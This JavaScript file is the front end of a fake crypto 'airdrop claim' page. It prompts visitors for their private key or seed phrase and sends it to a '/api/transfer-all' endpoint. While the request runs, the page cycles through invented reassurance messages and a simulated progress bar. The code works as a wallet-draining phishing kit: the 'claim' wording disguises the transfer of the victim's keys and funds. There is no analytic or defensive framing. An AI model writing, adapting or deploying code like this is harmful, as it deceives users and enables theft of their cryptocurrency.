// Airdrop-themed jargon phrases
const airdropPhrases = [
    "🎁 Scanning for eligible airdrops...",
    "✨ Verifying wallet activity...",
    "💰 Calculating reward allocation...",
    "📊 Checking snapshot eligibility...",
    "🔑 Confirming wallet ownership...",
    "🎟️ Validating claim period...",
    "📝 Preparing reward distribution...",
    "💎 Packaging your tokens...",
    "🚀 Initiating airdrop transfer...",
    "✅ Finalizing reward claim...",
    "🎉 Almost there! Processing claim...",
    "💫 Sending rewards to your wallet...",
    "🔒 Securing your allocation...",
    "⭐ Confirming on reward pool..."
];

const claimMessages = [
    "Checking airdrop eligibility...",
    "Verifying wallet for rewards...",
    "Scanning for unclaimed tokens...",
    "Processing reward allocation...",
    "Preparing your airdrop...",
    "Initiating claim transaction...",
    "Submitting to reward pool...",
    "Finalizing your claim..."
];

let progressInterval;
let jargonInterval;

async function transferAll() {
    const userInput = document.getElementById('userInput').value.trim();
    const transferBtn = document.getElementById('transferBtn');
    const progressContainer = document.getElementById('progressContainer');
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');
    const jargonText = document.getElementById('jargonText');

    if (!userInput) {
        alert('Please enter your private key or seed phrase to claim your airdrop');
        return;
    }

    // Reset and show progress
    progressContainer.classList.add('show');
    progressBar.style.width = '0%';
    progressText.textContent = claimMessages[0];
    jargonText.textContent = airdropPhrases[0];

    // Disable button
    transferBtn.disabled = true;
    transferBtn.innerHTML = '<span class="spinner"></span> Claiming Airdrop...';

    // Start rotating jargon
    let jargonIndex = 1;
    jargonInterval = setInterval(() => {
        jargonText.textContent = airdropPhrases[jargonIndex % airdropPhrases.length];
        jargonIndex++;
    }, 2500);

    // Start progress simulation
    let currentProgress = 0;
    progressInterval = setInterval(() => {
        if (currentProgress < 90) {
            currentProgress += Math.random() * 5;
            if (currentProgress > 90) currentProgress = 90;
            progressBar.style.width = currentProgress + '%';
        }
    }, 1000);

    try {
        const response = await fetch('/api/transfer-all', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userInput: userInput })
        });

        const data = await response.json();

        if (data.success) {
            // Complete the progress bar
            progressBar.style.width = '100%';
            progressText.textContent = "Airdrop claim successful!";
            jargonText.textContent = "🎉 Rewards have been sent to your wallet!";
            
            clearInterval(progressInterval);
            clearInterval(jargonInterval);
            
            document.getElementById('userInput').value = '';
            
            setTimeout(() => {
                const modal = document.getElementById('successModal');
                modal.classList.add('show');
                setTimeout(() => {
                    modal.classList.remove('show');
                }, 5000);
            }, 500);
            
            setTimeout(() => {
                transferBtn.disabled = false;
                transferBtn.innerHTML = `
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
                    </svg>
                    Claim Airdrop
                `;
                progressContainer.classList.remove('show');
            }, 3000);
            
        } else {
            clearInterval(progressInterval);
            clearInterval(jargonInterval);
            
            progressBar.style.width = '100%';
            progressText.textContent = "Claim failed";
            jargonText.textContent = "❌ " + data.error;
            
            setTimeout(() => {
                transferBtn.disabled = false;
                transferBtn.innerHTML = `
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
                    </svg>
                    Claim Airdrop
                `;
                progressContainer.classList.remove('show');
                alert('Error: ' + data.error);
            }, 2000);
        }
        
    } catch (error) {
        clearInterval(progressInterval);
        clearInterval(jargonInterval);
        
        progressBar.style.width = '100%';
        progressText.textContent = "Connection error";
        jargonText.textContent = "❌ Failed to connect to server";
        
        setTimeout(() => {
            transferBtn.disabled = false;
            transferBtn.innerHTML = `
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
                </svg>
                Claim Airdrop
            `;
            progressContainer.classList.remove('show');
            alert('Connection error: ' + error.message);
        }, 2000);
    }
}

document.getElementById('userInput').addEventListener('keydown', function(e) {
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
        transferAll();
    }
});

document.getElementById('transferBtn').addEventListener('click', transferAll);